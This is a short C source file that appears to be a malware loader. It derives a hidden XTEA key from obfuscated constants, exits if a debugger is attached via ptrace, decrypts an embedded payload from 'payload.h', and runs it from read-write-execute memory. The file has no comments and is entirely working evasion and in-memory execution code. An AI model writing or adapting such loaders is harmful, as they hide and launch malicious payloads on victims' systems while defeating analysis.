#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include "payload.h"

static unsigned int xk[4];

__attribute__((constructor)) static void derive(void) {
    unsigned int a = 0x1F2E3D4C, b = 0x0A5C36F1;
    for (int i = 0; i < 3; i++) { a = (a << 7) | (a >> 25); b ^= a; }
    xk[0] = a ^ 0x5A5A5A5A; xk[1] = b;
    xk[2] = a + b;          xk[3] = (b << 9) ^ (a >> 3);
}

static void xtea_dec(unsigned int *v) {
    unsigned int s = 0xC6EF3720u;
    for (int i = 0; i < 32; i++) {
        v[1] -= ((((v[0] << 4) ^ (v[0] >> 5)) + v[0]) ^ (s + xk[(s >> 11) & 3]));
        s   -= 0x9E3779B9u;
        v[0] -= ((((v[1] << 4) ^ (v[1] >> 5)) + v[1]) ^ (s + xk[s & 3]));
    }
}

int main(void) {
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) return 1;

    unsigned int *buf = malloc(PAYLOAD_LEN + 8);
    memcpy(buf, payload, PAYLOAD_LEN);
    for (size_t off = 0; off < PAYLOAD_LEN; off += 8) xtea_dec(buf + off / 4);

    unsigned char *mem = mmap(NULL, (PAYLOAD_LEN + 0xFFF) & ~0xFFF,
        PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(mem, buf, PAYLOAD_LEN);

    ((void (*)(void))mem)();
    return 0;
}
